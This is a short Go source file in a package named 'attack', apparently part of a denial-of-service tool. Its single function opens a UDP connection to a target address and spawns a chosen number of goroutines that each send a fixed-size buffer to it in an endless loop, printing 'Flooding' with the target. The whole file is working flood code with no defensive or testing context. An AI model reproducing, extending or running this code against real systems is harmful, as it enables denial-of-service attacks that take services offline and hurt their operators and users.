package attack

import (
	"fmt"
	"net"
)

func Attack(addr string, threads uint64, size uint64) error {
	conn, err := net.Dial("udp", addr)
	buff := make([]byte, size)
	if err != nil {
		return err
	}

	fmt.Printf("Flooding %s\n", addr)

	// loop
	var i uint64
	for i = 0; i < threads; i++ {
		go func() {
			for {
				_, _ = conn.Write(buff)
			}
		}()
	}

	return nil
}
